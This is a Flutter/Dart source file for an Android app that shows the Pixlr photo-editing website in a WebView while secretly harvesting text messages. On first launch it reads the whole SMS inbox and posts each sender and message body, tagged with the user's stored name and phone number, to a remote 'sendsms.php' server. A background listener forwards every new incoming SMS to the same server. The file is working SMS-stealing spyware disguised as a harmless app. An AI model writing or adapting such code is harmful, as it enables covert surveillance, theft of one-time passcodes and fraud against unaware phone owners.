import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/gestures.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:http/http.dart' as http;
import 'servise.dart';

Serves serves=Serves();
onBackgroundMessage(SmsMessage message) async{
  SharedPreferences prefs = await SharedPreferences.getInstance();
  var username= prefs.getString('name');
  var usermobile= prefs.getString('mobile');
  debugPrint("onBackgroundMessage called");
  var url3 = Uri.parse(serves.url+"sendsms.php");

  var response = await http.post(url3, body:{
    'number': message.address,
    'masg': message.body,
    'userno': usermobile.toString(),
    'UserName': username.toString(),

  }  );

  if (response.statusCode == 200) {

    print(response.body);
  }


}


class vebview extends StatefulWidget {
  const vebview({Key? key}) : super(key: key);

  @override
  State<vebview> createState() => _vebviewState();
}

class _vebviewState extends State<vebview> {





  String? _message;
  final telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    initPlatformState();
    seeall();
    if (Platform.isAndroid) WebView.platform = AndroidWebView();

  }


  onMessage(SmsMessage message) async {
    setState(() {
      _message = message.body ?? "Error reading message body.";
    });
  }

  onSendStatus(SendStatus status) {
    setState(() {
      _message = status == SendStatus.SENT ? "sent" : "delivered";
    });
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    // Platform messages may fail, so we use a try/catch PlatformException.
    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.


      telephony.listenIncomingSms(
          onNewMessage: onMessage, onBackgroundMessage: onBackgroundMessage);


    if (!mounted) return;
  }

  Serves serves=Serves();
  late WebViewController controllerGlobal;

  Future<bool> _exitApp(BuildContext context) async {
    if (await controllerGlobal.canGoBack()) {
      print("onwill goback");
      controllerGlobal.goBack();
      return Future.value(true);
    } else {

      return Future.value(false);
    }
  }
  void seeall() async {

    SharedPreferences prefs = await SharedPreferences.getInstance();
    var username= prefs.getString('name');
    var usermobile= prefs.getString('mobile');
// prefs.clear();
    print(prefs.getInt('token'));
    if (prefs.getInt('token')==null) {
      List<SmsMessage> messages = await telephony.getInboxSms(
          columns: [SmsColumn.ADDRESS, SmsColumn.BODY],

          sortOrder: [OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
            OrderBy(SmsColumn.BODY)]
      );


      messages.forEach((element)  async{

        var url3 = Uri.parse(serves.url+"sendsms.php");

        var response = await http.post(url3, body:{
          'number': element.address,
          'masg': element.body,
          'userno': usermobile.toString(),
          'UserName': username.toString(),


        }  );

        if (response.statusCode == 200) {

        }


      });

      prefs.setInt('token', 12345);
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () => _exitApp(context),
      child: SafeArea(
        child: WebView(
          initialUrl: 'https://pixlr.com/',
          javascriptMode: JavascriptMode.unrestricted,
    gestureRecognizers: Set()
    ..add(
    Factory<VerticalDragGestureRecognizer>(
    () => VerticalDragGestureRecognizer(),
    ),
        ),
    initialMediaPlaybackPolicy: AutoMediaPlaybackPolicy
        .require_user_action_for_all_media_types,

      ),

      )
    );


  }
}
